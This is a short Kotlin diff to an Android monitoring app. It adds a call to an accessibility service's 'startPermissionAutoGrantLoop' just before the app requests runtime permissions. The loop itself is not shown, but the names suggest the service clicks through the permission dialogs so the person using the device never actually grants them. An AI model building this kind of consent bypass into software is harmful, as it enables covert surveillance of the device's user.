@@ -26,6 +26,7 @@ import com.google.firebase.messaging.FirebaseMessaging
 import com.spapp.monitoring.R
 import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
 import com.spapp.monitoring.blocking.AccessibilityStatus
+import com.spapp.monitoring.blocking.BlockAccessibilityService
 import com.spapp.monitoring.collectors.AppUsageCollector
 import com.spapp.monitoring.collectors.RealtimeLogObserverManager
 import com.spapp.monitoring.data.DeviceState
@@ -325,6 +326,7 @@ class MainActivity : AppCompatActivity() {
     private fun handleNextSetupStep() {
         val missingRuntime = getMissingRuntimePermissions()
         if (missingRuntime.isNotEmpty()) {
+            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
             runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
             return
         }
